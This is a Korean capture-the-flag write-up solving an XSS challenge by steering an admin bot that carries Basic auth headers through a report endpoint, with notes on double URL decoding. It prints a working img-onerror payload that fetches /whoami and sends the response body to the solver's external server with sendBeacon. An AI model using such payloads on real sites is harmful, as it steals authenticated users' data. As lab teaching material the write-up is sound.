좋아. 내가 이 문제 처음 봤을 때 머릿속에서 굴린 순서 그대로 가자.

1단계 — flag부터 찾는다

제일 먼저 `FLAG` 글자를 검색함. 어디서 쓰이나 봤더니 /whoami 안에서만 등장.

```python
if id == 'admin' and password == '...':
    message = FLAG
```

결론: flag는 /whoami가 admin 비번 맞은 요청을 받았을 때만 응답에 들어감. 다른 길 없음. 그럼 "어떻게 admin으로 /whoami를 호출하지?"가 문제의 전부가 됨.

2단계 — 비번을 내가 아나? → 아니오. 그럼 누가 아나?

비번은 환경변수라 못 봄. 근데 코드를 보면 비번을 들고 다니는 놈이 하나 있음. access_page 안의 봇.

```python
driver.execute_cdp_cmd('Network.setExtraHTTPHeaders',
    {'headers': {'Authorization': f'Basic admin:비번'}})
```

이게 핵심 장치임. CDP의 setExtraHTTPHeaders는 그 브라우저가 앞으로 보내는 모든 요청에 이 헤더를 강제로 붙임. 봇이 a 페이지를 보든 b를 fetch하든 전부 admin 도장이 찍혀 나감.

결론: 나는 비번을 알 필요가 없음. 봇이 /whoami를 호출하게만 만들면, 그 요청엔 자동으로 admin 헤더가 붙고 → 응답에 flag가 박혀 옴.

3단계 — 봇을 어떻게 움직이나? → /intro

봇이 가는 곳이 정해져 있음.

```python
driver.get(".../intro?name=...&detail=...")
```

그리고 /intro는 내가 준 name/detail을 페이지에 그대로 출력함(render_template). 즉 여기에 XSS가 되면, 봇 브라우저 안에서 내 JS가 실행됨. 봇의 손을 빌리는 통로가 이거임.

4단계 — 그 JS가 뭘 해야 하나

여기서 한 끗 짚고 가야 함. flag가 쿠키에 있는 게 아님. /whoami 응답 HTML 본문에 들어있음.

그래서 평소 쓰던 쿠키 빼내기(document.cookie)는 무의미함. 대신:

```
봇 안에서 /whoami를 fetch
→ 응답 본문(text)을 읽음   ← 여기 flag가 있음
→ 그 본문을 내 서버로 전송
```

이게 되는 이유: fetch도 봇 브라우저가 쏘는 요청이라 admin 헤더가 붙음. 그리고 /whoami는 같은 출처(127.0.0.1:8000)라 응답 본문을 JS가 읽을 수 있음. 출처가 다르면 못 읽는데, 같으니까 가능.

페이로드:

```html
<img src=x onerror="fetch('/whoami').then(r=>r.text()).then(d=>navigator.sendBeacon('https://내서버',d))">
```

src=x로 일부러 이미지 로딩 실패시켜서 onerror 발동 → 그 안에서 fetch.

5단계 — 이걸 어떻게 봇한테 먹이나? → /report

내가 봇을 직접 못 부름. /report에 path를 내면, 서버가 거기서 name/detail을 뽑아 access_page(봇)한테 넘김.

```python
parsed = urlparse(path)
params = parse_qs(parsed.query)
name = params.get("name")
```

그래서 path를 이렇게 줌:

```
http://127.0.0.1:8000/intro?name=<페이로드>&detail=x
```

6단계 — 근데 그냥 넣으면 깨짐 (인코딩 이유)

path가 두 번 까임.

```
내가 낸 path
→ parse_qs가 깐다 (1차)      ← 여기서 name 뽑음
→ access_page가 quote 다시 씌움
→ 봇이 /intro 요청
→ Flask request.args가 깐다 (2차)  ← 여기서 최종 디코딩돼 페이지에 출력
```

문제는 parse_qs가 `&`로 파라미터를, `=`로 key/value를 자른다는 것. 페이로드 안에 raw `&`나 `=`이 있으면 parse_qs가 거기서 name을 잘라먹음. 그래서 처음 낼 때 인코딩해서 → 1차 파싱을 글자로 통과 → 중간 quote가 다시 씌워주고 → 2차에서 풀려 원본으로 출력됨. 까는 놈이 둘이라 한 번 인코딩이 필요한 거.

7단계 — 회수

내 서버 로그에 /whoami 응답 HTML이 통째로 찍힘 → 거기서 DH{...} 꺼내면 끝.

딱 하나 전제: intro.html이 name을 이스케이프 없이 뱉어야 함(| safe 같은 거). Jinja 기본은 자동 이스케이프라 `<`가 `&lt;`로 바뀌면 XSS 자체가 안 됨. 그러니 제일 먼저 확인할 건 템플릿이 name을 어떻게 출력하는지임. 그게 풀이의 진짜 전제 조건.
